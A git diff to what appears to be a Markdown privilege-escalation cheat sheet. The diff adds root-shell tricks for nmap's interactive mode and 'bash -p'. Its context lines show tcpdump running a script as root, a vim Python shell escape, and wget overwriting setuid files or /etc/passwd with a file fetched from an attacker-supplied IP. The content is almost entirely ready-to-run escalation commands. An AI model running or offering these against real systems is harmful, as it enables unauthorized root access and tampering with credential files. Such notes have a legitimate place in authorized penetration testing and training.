@@ -113,6 +113,8 @@ tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
 :py os.system("/bin/bash")
 ```
 
+[https://github.com/vim/vim/issues/1543](https://github.com/vim/vim/issues/1543)
+
 #### wget
 
 Any file that is overwritten by wget will maintain it's permissions \(double-check this\), so it's generally a good idea to overwrite either a setuid file that is not key for the machine to continue execution, or to overwrite something like `/etc/passwd`
@@ -121,6 +123,21 @@ Any file that is overwritten by wget will maintain it's permissions \(double-che
 wget <ip>:<file> -O setuid_file
 wget -i /etc/passwd
 ```
+
+#### nmap 2.0 - 5.21
+
+```text
+nmap --interactive
+!sh
+```
+
+#### bash
+
+```text
+bash -p
+```
+
+
 
 #### References
 
